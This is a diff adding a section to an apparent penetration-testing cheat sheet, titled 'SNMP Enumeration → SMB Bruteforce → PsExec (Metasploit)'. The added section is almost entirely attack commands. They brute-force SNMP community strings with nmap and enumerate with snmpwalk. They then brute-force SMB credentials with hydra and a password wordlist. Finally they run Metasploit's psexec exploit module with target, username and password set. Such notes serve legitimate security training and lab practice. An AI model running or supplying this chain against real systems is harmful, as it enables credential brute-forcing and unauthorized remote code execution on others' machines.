@@ -259,6 +259,30 @@ exploit
 
 ---
 
+### SNMP Enumeration → SMB Bruteforce → PsExec (Metasploit)
+    ```bash
+    # 1. Scan UDP port 161 for SNMP service and try brute-force community strings
+    nmap -sU -p 161 --script=snmp-brute <target>
+    
+    # 2. Enumerate SNMP data with common community string
+    snmpwalk -v 1 -c public <target>
+    
+    # 3. Run all SNMP-related scripts and save results
+    nmap -sU -p 161 --script snmp-* <target> > snmp_output
+    
+    # 4. Prepare SMB bruteforce
+    ls
+    hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> smb
+    
+    # 5. Exploit SMB service using PsExec (Metasploit)
+    msfconsole -q
+    use exploit/windows/smb/psexec
+    show options
+    set RHOSTS <target>
+    set SMBUSER <username>
+    set SMBPASS <password>
+    exploit
+    ```
 ### SMB Enumeration & Exploitation Flow
   
    ```bash
